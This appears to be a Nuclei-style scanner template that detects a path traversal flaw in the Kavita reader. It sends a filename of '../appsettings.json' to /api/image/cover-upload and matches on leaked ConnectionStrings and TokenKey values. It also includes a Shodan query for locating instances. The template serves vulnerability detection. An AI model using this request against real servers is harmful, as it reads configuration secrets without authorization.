http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"ConnectionStrings":'
    - '"Path":'
    - '"TokenKey":'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/image/cover-upload?filename=../appsettings.json'
id: kavita-lfi
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:kavitareader:kavita:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: 'Kavita - Path Traversal is vulnerable to local file inclusion via
    abusing the Path Traversal filename parameter of the /api/image/cover-upload.

    '
  metadata:
    max-request: 1
    product: kavita
    shodan-query: http.html:"kavita"
    vendor: kavitareader
    verified: true
  name: Kavita - Local File Inclusion
  reference:
  - https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
  severity: high
  tags: kavita,lfi,huntr,vuln
